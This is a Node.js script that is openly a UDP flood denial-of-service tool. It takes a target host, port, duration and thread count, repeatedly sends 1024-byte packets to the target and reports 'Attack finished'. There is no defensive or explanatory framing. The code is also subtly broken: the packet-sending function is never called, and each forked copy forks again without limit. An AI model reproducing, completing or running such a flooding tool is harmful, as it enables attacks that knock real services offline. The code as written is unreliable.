const dgram = require('dgram');
const process = require('process');
const { fork } = require('child_process');

if (process.argv.length !== 6) {
    console.log(`Usage: node ${process.argv[1]} <host> <port> <time> <thread>`);
    process.exit(1);
}

const host = process.argv[2];
const port = parseInt(process.argv[3]);
const time = parseInt(process.argv[4]);
const thread = parseInt(process.argv[5]);

function createPacket() {
    const packet = Buffer.alloc(1024, 'A');
    return packet;
}

function sendPacket() {
    const socket = dgram.createSocket('udp4');
    const packet = createPacket();
    setInterval(() => {
        socket.send(packet, 0, packet.length, port, host, (err) => {
            if (err) console.error(err);
        });
    }, 1);
}

for (let i = 0; i < thread; i++) {
    fork(__filename, [host, port, time, 1]);
}

setTimeout(() => {
    console.log('Attack finished');
    process.exit(0);
}, time * 1000);
